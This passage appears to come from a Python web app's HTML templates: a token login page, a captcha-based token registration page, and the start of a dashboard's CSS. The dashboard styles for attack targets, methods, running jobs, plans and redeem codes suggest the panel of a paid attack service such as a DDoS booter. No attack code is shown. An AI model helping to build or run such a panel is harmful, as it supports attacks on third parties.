    width: 56px; height: 56px;
    background: linear-gradient(135deg, rgba(0,220,170,0.15), rgba(0,170,255,0.15));
    border: 1px solid var(--border);
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 18px;
    font-size: 24px;
    box-shadow: 0 0 20px rgba(0,220,170,0.2);
    animation: pulse 3s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { box-shadow: 0 0 20px rgba(0,220,170,0.2); }
    50%       { box-shadow: 0 0 35px rgba(0,220,170,0.4); }
  }
  .title {
    font-family: 'Syne', sans-serif;
    font-size: 28px;
    font-weight: 800;
    background: linear-gradient(90deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: -0.5px;
  }
  .subtitle {
    color: var(--muted);
    font-size: 13px;
    margin-top: 6px;
    letter-spacing: 0.5px;
  }

  /* Alerts */
  .alert {
    padding: 12px 16px;
    border-radius: 12px;
    font-size: 13.5px;
    margin-bottom: 20px;
    border: 1px solid;
    display: flex;
    align-items: center;
    gap: 10px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
  .alert-danger  { background: rgba(255,77,109,0.1);  border-color: rgba(255,77,109,0.3);  color: #ff8fa3; }
  .alert-success { background: rgba(0,220,170,0.1);   border-color: rgba(0,220,170,0.3);   color: var(--accent); }
  .alert-warning { background: rgba(255,190,50,0.1);  border-color: rgba(255,190,50,0.3);  color: #ffd166; }

  /* Form */
  .field {
    margin-bottom: 20px;
    position: relative;
  }
  .field label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    letter-spacing: 0.8px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 8px;
  }
  .input-wrap {
    position: relative;
  }
  .input-icon {
    position: absolute;
    left: 16px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 16px;
    opacity: 0.6;
    pointer-events: none;
    transition: opacity 0.2s;
  }
  input[type="text"],
  input[type="password"],
  input[type="number"] {
    width: 100%;
    background: rgba(0,0,0,0.4);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 14px;
    padding: 14px 18px 14px 44px;
    color: var(--text);
    font-family: 'Space Grotesk', sans-serif;
    font-size: 15px;
    outline: none;
    transition: all 0.25s ease;
    -webkit-appearance: none;
  }
  input::placeholder { color: rgba(200,230,220,0.3); }
  input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(0,220,170,0.12), 0 0 20px rgba(0,220,170,0.08);
    background: rgba(0,220,170,0.04);
  }
  input:focus + .focus-line { transform: scaleX(1); }

  /* Captcha box */
  .captcha-box {
    background: rgba(0,220,170,0.04);
    border: 1px dashed rgba(0,220,170,0.2);
    border-radius: 14px;
    padding: 14px 18px;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .captcha-question {
    font-size: 15px;
    font-weight: 600;
    color: var(--accent);
    letter-spacing: 0.5px;
  }
  .captcha-label {
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    background: rgba(0,220,170,0.1);
    border-radius: 6px;
    padding: 3px 8px;
  }

  /* Button */
  .btn-primary {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #00dcaa, #00aaff);
    border: none;
    border-radius: 14px;
    color: #020408;
    font-family: 'Syne', sans-serif;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.25s ease;
    position: relative;
    overflow: hidden;
    margin-top: 8px;
  }
  .btn-primary::before {
    content: '';
    position: absolute;
    inset: 0;
    background: rgba(255,255,255,0.15);
    transform: translateX(-100%) skewX(-15deg);
    transition: transform 0.4s ease;
  }
  .btn-primary:hover::before { transform: translateX(100%) skewX(-15deg); }
  .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 30px rgba(0,220,170,0.35); }
  .btn-primary:active { transform: translateY(0); }

  /* Divider */
  .divider {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 28px 0 20px;
  }
  .divider-line { flex: 1; height: 1px; background: rgba(255,255,255,0.07); }
  .divider-text { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }

  /* Footer links */
  .footer-links {
    display: flex;
    flex-direction: column;
    gap: 10px;
    text-align: center;
  }
  .footer-links p { font-size: 13.5px; color: var(--muted); }
  .footer-links a {
    color: var(--accent);
    text-decoration: none;
    font-weight: 600;
    transition: color 0.2s;
    position: relative;
  }
  .footer-links a:hover { color: #fff; }

  .admin-link {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 12px;
    color: rgba(200,230,220,0.35) !important;
    font-weight: 400 !important;
    border: 1px solid rgba(255,255,255,0.06);
    border-radius: 8px;
    padding: 6px 14px;
    transition: all 0.2s !important;
  }
  .admin-link:hover { color: var(--muted) !important; border-color: rgba(255,255,255,0.12) !important; background: rgba(255,255,255,0.03); }

  /* Show/hide password */
  .toggle-pass {
    position: absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: var(--muted);
    cursor: pointer;
    font-size: 16px;
    padding: 0;
    transition: color 0.2s;
    line-height: 1;
  }
  .toggle-pass:hover { color: var(--accent); }

  /* Strength indicator */
  .token-hint {
    font-size: 11px;
    color: var(--muted);
    margin-top: 6px;
    padding-left: 4px;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .dot { width: 5px; height: 5px; border-radius: 50%; background: var(--accent); display: inline-block; }
</style>
</head>
<body>

<div class="bg-orbs">
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>
</div>
<div class="grid-bg"></div>

<div class="card">

  <div class="header">
    <div class="logo-icon">🔐</div>
    <h1 class="title">Access Portal</h1>
    <p class="subtitle">Enter your token to continue</p>
  </div>

  <!-- Flash messages (Jinja2 template) -->
  {% with messages = get_flashed_messages(with_categories=true) %}
    {% for cat, msg in messages %}
      <div class="alert alert-{{ cat }}">
        {% if cat == 'danger' %}⚠️{% elif cat == 'success' %}✅{% else %}ℹ️{% endif %}
        {{ msg }}
      </div>
    {% endfor %}
  {% endwith %}

  <form method="POST" autocomplete="off">

    <div class="field">
      <label>Access Token</label>
      <div class="input-wrap">
        <span class="input-icon">🗝️</span>
        <input type="password" name="token" id="tokenInput" placeholder="Paste your token here" required autocomplete="off">
        <button type="button" class="toggle-pass" onclick="toggleToken()" id="toggleBtn" title="Show/hide token">👁️</button>
      </div>
      <p class="token-hint"><span class="dot"></span>Your token is case-sensitive</p>
    </div>

    <div class="field">
      <label>Security Check</label>
      <div class="captcha-box">
        <span class="captcha-question">{{ captcha_question }}</span>
        <span class="captcha-label">Captcha</span>
      </div>
      <div class="input-wrap">
        <span class="input-icon">🔢</span>
        <input type="text" name="captcha" placeholder="Your answer" required autocomplete="off" inputmode="numeric">
      </div>
    </div>

    <button type="submit" class="btn-primary">
      🚀 &nbsp; Sign In
    </button>

  </form>

  <div class="divider">
    <div class="divider-line"></div>
    <span class="divider-text">or</span>
    <div class="divider-line"></div>
  </div>

  <div class="footer-links">
    <p>No token? <a href="/register">Generate one →</a></p>
    <p><a href="/admin/login" class="admin-link">⚙️ Admin Login</a></p>
  </div>

</div>

<script>
  function toggleToken() {
    const input = document.getElementById('tokenInput');
    const btn = document.getElementById('toggleBtn');
    if (input.type === 'password') {
      input.type = 'text';
      btn.textContent = '🙈';
    } else {
      input.type = 'password';
      btn.textContent = '👁️';
    }
  }
</script>

</body>
</html>
'''

REGISTER_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Register • Access Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  :root {
    --bg: #020408;
    --surface: rgba(8, 18, 32, 0.75);
    --border: rgba(0, 170, 255, 0.18);
    --accent: #00aaff;
    --accent2: #00dcaa;
    --text: #e8f4f0;
    --muted: rgba(200, 220, 240, 0.45);
    --radius: 28px;
  }

  body {
    background: var(--bg);
    font-family: 'Space Grotesk', sans-serif;
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    overflow: hidden;
    position: relative;
  }

  .bg-orbs {
    position: fixed;
    inset: 0;
    z-index: 0;
    pointer-events: none;
  }
  .orb {
    position: absolute;
    border-radius: 50%;
    filter: blur(80px);
    opacity: 0.22;
    animation: drift linear infinite;
  }
  .orb-1 { width: 500px; height: 500px; background: radial-gradient(circle, #00aaff, transparent); top: -150px; right: -100px; animation-duration: 20s; }
  .orb-2 { width: 400px; height: 400px; background: radial-gradient(circle, #00dcaa, transparent); bottom: -100px; left: -80px; animation-duration: 25s; animation-direction: reverse; }
  .orb-3 { width: 250px; height: 250px; background: radial-gradient(circle, #ff40aa, transparent); top: 30%; right: 20%; animation-duration: 30s; opacity: 0.12; }

  @keyframes drift {
    0%   { transform: translate(0, 0) scale(1); }
    33%  { transform: translate(-40px, 30px) scale(1.06); }
    66%  { transform: translate(20px, -20px) scale(0.96); }
    100% { transform: translate(0, 0) scale(1); }
  }

  .grid-bg {
    position: fixed;
    inset: 0;
    z-index: 0;
    background-image:
      linear-gradient(rgba(0,170,255,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(0,170,255,0.04) 1px, transparent 1px);
    background-size: 48px 48px;
    pointer-events: none;
  }

  .card {
    position: relative;
    z-index: 10;
    background: var(--surface);
    backdrop-filter: blur(20px) saturate(1.4);
    -webkit-backdrop-filter: blur(20px) saturate(1.4);
    border: 1px solid var(--border);
    border-radius: var(--radius);
    padding: 48px 44px;
    width: 100%;
    max-width: 460px;
    box-shadow:
      0 0 0 1px rgba(0,170,255,0.06),
      0 30px 60px rgba(0,0,0,0.5),
      0 0 80px rgba(0,170,255,0.05) inset;
    animation: slideUp 0.7s cubic-bezier(0.22, 1, 0.36, 1) both;
  }

  @keyframes slideUp {
    from { opacity: 0; transform: translateY(32px) scale(0.97); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }

  .card::before {
    content: '';
    position: absolute;
    top: -1px; left: -1px;
    width: 80px; height: 80px;
    border-top: 2px solid var(--accent);
    border-left: 2px solid var(--accent);
    border-radius: var(--radius) 0 0 0;
    opacity: 0.7;
  }
  .card::after {
    content: '';
    position: absolute;
    bottom: -1px; right: -1px;
    width: 80px; height: 80px;
    border-bottom: 2px solid var(--accent2);
    border-right: 2px solid var(--accent2);
    border-radius: 0 0 var(--radius) 0;
    opacity: 0.7;
  }

  .header {
    text-align: center;
    margin-bottom: 32px;
  }
  .logo-icon {
    width: 56px; height: 56px;
    background: linear-gradient(135deg, rgba(0,170,255,0.15), rgba(0,220,170,0.15));
    border: 1px solid var(--border);
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 18px;
    font-size: 24px;
    box-shadow: 0 0 20px rgba(0,170,255,0.2);
    animation: pulse 3s ease-in-out infinite;
  }
  @keyframes pulse {
    0%, 100% { box-shadow: 0 0 20px rgba(0,170,255,0.2); }
    50%       { box-shadow: 0 0 35px rgba(0,170,255,0.4); }
  }
  .title {
    font-family: 'Syne', sans-serif;
    font-size: 28px;
    font-weight: 800;
    background: linear-gradient(90deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    letter-spacing: -0.5px;
  }
  .subtitle {
    color: var(--muted);
    font-size: 13px;
    margin-top: 6px;
    letter-spacing: 0.3px;
  }

  /* Info box */
  .info-box {
    background: rgba(0,170,255,0.06);
    border: 1px solid rgba(0,170,255,0.2);
    border-radius: 14px;
    padding: 16px 18px;
    margin-bottom: 24px;
    display: flex;
    gap: 12px;
    align-items: flex-start;
  }
  .info-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
  .info-text { font-size: 13px; color: rgba(200,220,240,0.7); line-height: 1.6; }
  .info-text strong { color: var(--accent); }

  /* Alerts */
  .alert {
    padding: 12px 16px;
    border-radius: 12px;
    font-size: 13.5px;
    margin-bottom: 20px;
    border: 1px solid;
    display: flex;
    align-items: center;
    gap: 10px;
    animation: fadeIn 0.3s ease;
  }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(-6px); } to { opacity: 1; transform: translateY(0); } }
  .alert-danger  { background: rgba(255,77,109,0.1);  border-color: rgba(255,77,109,0.3);  color: #ff8fa3; }
  .alert-success { background: rgba(0,220,170,0.1);   border-color: rgba(0,220,170,0.3);   color: var(--accent2); }
  .alert-warning { background: rgba(255,190,50,0.1);  border-color: rgba(255,190,50,0.3);  color: #ffd166; }

  /* Token display (for success state) */
  .token-display {
    background: rgba(0,0,0,0.4);
    border: 1px solid rgba(0,220,170,0.3);
    border-radius: 14px;
    padding: 16px 18px;
    margin-bottom: 20px;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    color: var(--accent2);
    word-break: break-all;
    line-height: 1.6;
    position: relative;
  }
  .token-display-label {
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    margin-bottom: 6px;
    font-family: 'Space Grotesk', sans-serif;
  }

  /* Form */
  .field {
    margin-bottom: 20px;
  }
  .field label {
    display: block;
    font-size: 12px;
    font-weight: 600;
    letter-spacing: 0.8px;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 8px;
  }
  .captcha-box {
    background: rgba(0,170,255,0.04);
    border: 1px dashed rgba(0,170,255,0.2);
    border-radius: 14px;
    padding: 14px 18px;
    margin-bottom: 8px;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .captcha-question {
    font-size: 16px;
    font-weight: 700;
    color: var(--accent);
    letter-spacing: 0.5px;
  }
  .captcha-label {
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    color: var(--muted);
    background: rgba(0,170,255,0.1);
    border-radius: 6px;
    padding: 3px 8px;
  }
  .input-wrap { position: relative; }
  .input-icon {
    position: absolute;
    left: 16px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 16px;
    opacity: 0.6;
    pointer-events: none;
  }
  input[type="text"],
  input[type="number"] {
    width: 100%;
    background: rgba(0,0,0,0.4);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 14px;
    padding: 14px 18px 14px 44px;
    color: var(--text);
    font-family: 'Space Grotesk', sans-serif;
    font-size: 15px;
    outline: none;
    transition: all 0.25s ease;
    -webkit-appearance: none;
  }
  input::placeholder { color: rgba(200,220,240,0.3); }
  input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(0,170,255,0.12), 0 0 20px rgba(0,170,255,0.08);
    background: rgba(0,170,255,0.04);
  }

  /* Steps */
  .steps {
    display: flex;
    align-items: center;
    gap: 0;
    margin-bottom: 28px;
  }
  .step {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    position: relative;
  }
  .step:not(:last-child)::after {
    content: '';
    position: absolute;
    top: 14px;
    left: 60%;
    width: 80%;
    height: 1px;
    background: rgba(255,255,255,0.1);
  }
  .step-num {
    width: 28px; height: 28px;
    background: rgba(0,170,255,0.15);
    border: 1px solid rgba(0,170,255,0.3);
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    font-size: 12px;
    font-weight: 700;
    color: var(--accent);
    z-index: 1;
  }
  .step-text {
    font-size: 10px;
    color: var(--muted);
    text-align: center;
    letter-spacing: 0.3px;
  }
  .step.active .step-num {
    background: var(--accent);
    color: #020408;
    box-shadow: 0 0 12px rgba(0,170,255,0.4);
  }
  .step.active .step-text { color: var(--accent); }

  .btn-primary {
    width: 100%;
    padding: 15px;
    background: linear-gradient(135deg, #00aaff, #00dcaa);
    border: none;
    border-radius: 14px;
    color: #020408;
    font-family: 'Syne', sans-serif;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 0.5px;
    cursor: pointer;
    transition: all 0.25s ease;
    position: relative;
    overflow: hidden;
    margin-top: 4px;
  }
  .btn-primary::before {
    content: '';
    position: absolute;
    inset: 0;
    background: rgba(255,255,255,0.15);
    transform: translateX(-100%) skewX(-15deg);
    transition: transform 0.4s ease;
  }
  .btn-primary:hover::before { transform: translateX(100%) skewX(-15deg); }
  .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 30px rgba(0,170,255,0.35); }
  .btn-primary:active { transform: translateY(0); }

  .divider {
    display: flex;
    align-items: center;
    gap: 12px;
    margin: 24px 0 20px;
  }
  .divider-line { flex: 1; height: 1px; background: rgba(255,255,255,0.07); }
  .divider-text { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }

  .footer-links {
    text-align: center;
  }
  .footer-links p { font-size: 13.5px; color: var(--muted); }
  .footer-links a {
    color: var(--accent2);
    text-decoration: none;
    font-weight: 600;
    transition: color 0.2s;
  }
  .footer-links a:hover { color: #fff; }
</style>
</head>
<body>

<div class="bg-orbs">
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>
</div>
<div class="grid-bg"></div>

<div class="card">

  <div class="header">
    <div class="logo-icon">✨</div>
    <h1 class="title">Create Account</h1>
    <p class="subtitle">Generate your unique access token</p>
  </div>

  <!-- Steps indicator -->
  <div class="steps">
    <div class="step active">
      <div class="step-num">1</div>
      <div class="step-text">Verify</div>
    </div>
    <div class="step">
      <div class="step-num">2</div>
      <div class="step-text">Generate</div>
    </div>
    <div class="step">
      <div class="step-num">3</div>
      <div class="step-text">Login</div>
    </div>
  </div>

  <!-- Info box -->
  <div class="info-box">
    <div class="info-icon">💡</div>
    <div class="info-text">
      Solve the captcha to generate your <strong>unique access token</strong>. Save it securely — you'll need it to log in.
    </div>
  </div>

  <!-- Flash messages -->
  {% with messages = get_flashed_messages(with_categories=true) %}
    {% for cat, msg in messages %}
      <div class="alert alert-{{ cat }}">
        {% if cat == 'danger' %}⚠️{% elif cat == 'success' %}✅{% else %}ℹ️{% endif %}
        {{ msg }}
      </div>
    {% endfor %}
  {% endwith %}

  <form method="POST" autocomplete="off">

    <div class="field">
      <label>Security Check</label>
      <div class="captcha-box">
        <span class="captcha-question">{{ captcha_question }}</span>
        <span class="captcha-label">Captcha</span>
      </div>
      <div class="input-wrap">
        <span class="input-icon">🔢</span>
        <input type="text" name="captcha" placeholder="Your answer" required autocomplete="off" inputmode="numeric">
      </div>
    </div>

    <button type="submit" class="btn-primary">
      🎫 &nbsp; Generate My Token
    </button>

  </form>

  <div class="divider">
    <div class="divider-line"></div>
    <span class="divider-text">have an account?</span>
    <div class="divider-line"></div>
  </div>

  <div class="footer-links">
    <p>Already have a token? <a href="/login">Sign in →</a></p>
  </div>

</div>

</body>
</html>
'''

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
<title>Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --bg: #030508;
  --surface: rgba(6, 16, 28, 0.72);
  --surface2: rgba(4, 12, 22, 0.6);
  --border: rgba(0, 255, 200, 0.15);
  --border2: rgba(255,255,255,0.06);
  --accent: #00ffcc;
  --accent2: #00aaff;
  --text: #cce8e0;
  --muted: rgba(180, 220, 210, 0.45);
  --sidebar-w: 270px;
  --radius: 20px;
}

body {
  background: var(--bg);
  font-family: 'Rajdhani', sans-serif;
  color: var(--text);
  min-height: 100vh;
  overflow-x: hidden;
}

/* ── Background ── */
.bg-grid {
  position: fixed; inset: 0; z-index: 0; pointer-events: none;
  background-image:
    linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
  background-size: 56px 56px;
}
.orb {
  position: fixed; border-radius: 50%; filter: blur(110px);
  opacity: 0.16; pointer-events: none; z-index: 0;
  animation: orbFloat linear infinite;
}
.orb-1 { width: 600px; height: 600px; background: radial-gradient(#00ffcc, transparent 70%); top: -200px; left: 20px; animation-duration: 24s; }
.orb-2 { width: 500px; height: 500px; background: radial-gradient(#00aaff, transparent 70%); bottom: -150px; right: -100px; animation-duration: 30s; animation-direction: reverse; }
@keyframes orbFloat {
  0%   { transform: translate(0,0) scale(1); }
  33%  { transform: translate(30px,-20px) scale(1.05); }
  66%  { transform: translate(-20px,15px) scale(0.96); }
  100% { transform: translate(0,0) scale(1); }
}

/* ── Sidebar ── */
.sidebar {
  position: fixed; left: 0; top: 0;
  width: var(--sidebar-w); height: 100%;
  background: rgba(3, 10, 18, 0.92);
  backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
  border-right: 1px solid var(--border);
  padding: 28px 18px;
  z-index: 50;
  display: flex; flex-direction: column;
  transition: transform 0.3s ease;
}

.sidebar-logo {
  text-align: center; margin-bottom: 32px; padding-bottom: 24px;
  border-bottom: 1px solid var(--border2);
}
.logo-text {
  font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
  letter-spacing: 2px;
}
.logo-sub { font-size: 11px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }

/* Nav */
.nav-section-label {
  font-size: 10px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; color: rgba(180,220,210,0.25);
  padding: 0 12px; margin: 16px 0 6px;
}
.nav-link {
  display: flex; align-items: center; gap: 12px;
  padding: 11px 14px; margin: 3px 0;
  border-radius: 12px; color: var(--muted);
  text-decoration: none; font-size: 14px; font-weight: 600;
  letter-spacing: 0.3px; transition: all 0.2s;
  border: 1px solid transparent;
}
.nav-link i { width: 18px; text-align: center; font-size: 14px; opacity: 0.7; flex-shrink: 0; }
.nav-link:hover { color: var(--accent); background: rgba(0,255,200,0.06); border-color: rgba(0,255,200,0.1); }
.nav-link.active {
  color: var(--accent); background: rgba(0,255,200,0.1);
  border-color: rgba(0,255,200,0.2);
  box-shadow: 0 0 12px rgba(0,255,200,0.06) inset;
}
.nav-link.active i { opacity: 1; }

/* Plan info */
.plan-box {
  margin-top: auto; padding-top: 20px;
  border-top: 1px solid var(--border2);
}
.plan-badge {
  display: inline-flex; align-items: center; gap: 6px;
  background: rgba(0,255,200,0.08); border: 1px solid var(--border);
  border-radius: 20px; padding: 4px 12px; margin-bottom: 14px;
  font-family: 'Orbitron', monospace; font-size: 11px; font-weight: 700;
  letter-spacing: 1px; color: var(--accent);
}
.plan-stat {
  display: flex; align-items: center; justify-content: space-between;
  padding: 7px 0; border-bottom: 1px solid rgba(255,255,255,0.04);
  font-size: 13px;
}
.plan-stat:last-child { border-bottom: none; }
.plan-stat-label { color: var(--muted); display: flex; align-items: center; gap: 8px; }
.plan-stat-label i { width: 14px; text-align: center; font-size: 12px; }
.plan-stat-val { font-weight: 700; color: var(--text); font-family: 'Orbitron', monospace; font-size: 12px; }

/* ── Mobile toggle ── */
.menu-toggle {
  display: none; position: fixed; top: 16px; left: 16px; z-index: 60;
  background: var(--accent); border: none; border-radius: 10px;
  width: 40px; height: 40px; color: #020408; font-size: 16px;
  cursor: pointer; align-items: center; justify-content: center;
  box-shadow: 0 4px 16px rgba(0,255,200,0.3);
}

/* ── Main content ── */
.main {
  margin-left: var(--sidebar-w);
  padding: 32px 28px;
  position: relative; z-index: 10;
  animation: fadeUp 0.6s ease both;
}
@keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }

/* Page header */
.page-header {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 28px; flex-wrap: wrap; gap: 12px;
}
.page-title {
  font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
}
.online-pill {
  display: inline-flex; align-items: center; gap: 7px;
  background: rgba(0,255,200,0.08); border: 1px solid rgba(0,255,200,0.2);
  border-radius: 20px; padding: 5px 14px;
  font-size: 12px; font-weight: 700; letter-spacing: 1px; color: var(--accent);
}
.online-dot { width: 7px; height: 7px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); animation: blink 2s ease infinite; }
@keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }

/* Section title */
.section-title {
  font-family: 'Orbitron', monospace; font-size: 12px; font-weight: 700;
  letter-spacing: 2px; text-transform: uppercase; color: var(--muted);
  margin-bottom: 14px; display: flex; align-items: center; gap: 10px;
}
.section-title::after { content:''; flex:1; height:1px; background:linear-gradient(90deg,var(--border),transparent); }

/* Cards */
.card {
  background: var(--surface);
  backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
  border: 1px solid var(--border); border-radius: var(--radius);
  padding: 28px; margin-bottom: 22px;
  transition: border-color 0.3s, box-shadow 0.3s;
}
.card:hover { border-color: rgba(0,255,200,0.3); box-shadow: 0 12px 40px rgba(0,0,0,0.3); }

/* Stats row */
.stats-row {
  display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px;
  margin-bottom: 22px;
}
.stat-card {
  background: var(--surface2);
  border: 1px solid var(--border2); border-radius: 16px;
  padding: 22px 20px; text-align: center;
  transition: border-color 0.2s;
}
.stat-card:hover { border-color: rgba(0,255,200,0.2); }
.stat-number {
  font-family: 'Orbitron', monospace; font-size: 40px; font-weight: 900;
  background: linear-gradient(135deg, #fff, var(--accent));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
  line-height: 1;
}
.stat-label { font-size: 12px; color: var(--muted); margin-top: 6px; letter-spacing: 0.5px; text-transform: uppercase; }

/* Progress bar */
.progress-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; font-size: 14px; font-weight: 600; }
.progress-pct { font-family: 'Orbitron', monospace; font-size: 13px; color: var(--accent); }
.progress-track {
  height: 8px; background: rgba(255,255,255,0.06);
  border-radius: 20px; overflow: hidden;
}
.progress-fill {
  height: 100%; border-radius: 20px;
  background: linear-gradient(90deg, var(--accent), var(--accent2));
  transition: width 1.2s cubic-bezier(0.22,1,0.36,1);
  box-shadow: 0 0 12px rgba(0,255,200,0.4);
}

/* Upgrade button */
.btn-upgrade {
  display: block; width: 100%; padding: 14px;
  background: linear-gradient(135deg, var(--accent), var(--accent2));
  border: none; border-radius: 12px;
  color: #020408; font-family: 'Orbitron', monospace;
  font-size: 12px; font-weight: 700; letter-spacing: 2px;
  text-transform: uppercase; text-decoration: none; text-align: center;
  cursor: pointer; transition: all 0.25s ease; margin-top: 20px;
  position: relative; overflow: hidden;
}
.btn-upgrade::before {
  content: ''; position: absolute; inset: 0;
  background: rgba(255,255,255,0.15);
  transform: translateX(-100%) skewX(-15deg);
  transition: transform 0.4s ease;
}
.btn-upgrade:hover::before { transform: translateX(100%) skewX(-15deg); }
.btn-upgrade:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(0,255,200,0.35); }

/* Redeem form */
.redeem-row {
  display: flex; gap: 12px; margin: 16px 0 8px; flex-wrap: wrap;
}
.redeem-input {
  flex: 1; min-width: 180px;
  background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.07);
  border-radius: 12px; padding: 13px 18px;
  color: var(--text); font-family: 'Orbitron', monospace; font-size: 12px;
  letter-spacing: 1px; outline: none; transition: all 0.2s;
}
.redeem-input::placeholder { color: rgba(180,220,210,0.2); font-family: 'Rajdhani',sans-serif; font-size:14px; letter-spacing:0.5px; }
.redeem-input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0,255,200,0.1); background: rgba(0,255,200,0.03); }
.btn-redeem {
  padding: 13px 24px; background: rgba(0,255,200,0.12);
  border: 1px solid rgba(0,255,200,0.3); border-radius: 12px;
  color: var(--accent); font-family: 'Orbitron', monospace;
  font-size: 11px; font-weight: 700; letter-spacing: 1.5px;
  cursor: pointer; transition: all 0.2s; white-space: nowrap;
}
.btn-redeem:hover { background: rgba(0,255,200,0.2); transform: translateY(-1px); }
.redeem-note { font-size: 12px; color: var(--muted); }

/* Table */
.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; }
thead tr { border-bottom: 1px solid var(--border); background: rgba(0,255,200,0.04); }
th {
  padding: 11px 14px; font-family: 'Orbitron', monospace;
  font-size: 10px; font-weight: 700; letter-spacing: 1.5px;
  text-transform: uppercase; color: var(--muted); text-align: left; white-space: nowrap;
}
td {
  padding: 13px 14px; font-size: 13px; font-weight: 500;
  border-bottom: 1px solid rgba(255,255,255,0.04); vertical-align: middle;
}
tbody tr { transition: background 0.15s; }
tbody tr:hover { background: rgba(0,255,200,0.03); }
tbody tr:last-child td { border-bottom: none; }

.status-badge {
  display: inline-flex; align-items: center; gap: 5px;
  padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 700;
}
.s-done { background: rgba(0,255,170,0.1); border: 1px solid rgba(0,255,170,0.25); color: #00ffaa; }
.s-running { background: rgba(0,170,255,0.1); border: 1px solid rgba(0,170,255,0.25); color: var(--accent2); animation: blink 1.5s infinite; }

.target-cell { font-family: 'Orbitron', monospace; font-size: 11px; color: var(--accent2); }
.method-cell { font-size: 11px; font-weight: 700; letter-spacing: 0.5px; color: var(--muted); text-transform: uppercase; }

.empty-state { text-align: center; padding: 40px 20px; color: var(--muted); }
